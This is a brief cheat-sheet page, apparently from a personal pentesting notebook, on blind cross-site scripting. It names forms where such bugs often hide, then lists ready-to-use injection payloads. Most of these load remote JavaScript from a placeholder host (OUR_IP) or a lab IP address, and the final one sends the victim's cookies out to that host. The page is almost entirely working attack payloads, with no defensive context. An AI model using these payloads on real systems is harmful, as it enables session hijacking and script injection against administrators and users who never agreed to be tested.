---
{"dg-publish":true,"permalink":"/blind-xss/"}
---


Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header


```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

```html
<script src=http://OUR_IP/fullname></script>
```
```html
"><script src="http://10.10.15.11/username"></script>
```

```html
"><script src="http://10.10.15.11/script.js"></script>
```

```js
new Image().src='http://10.10.15.11/index.php?c='+document.cookie$
```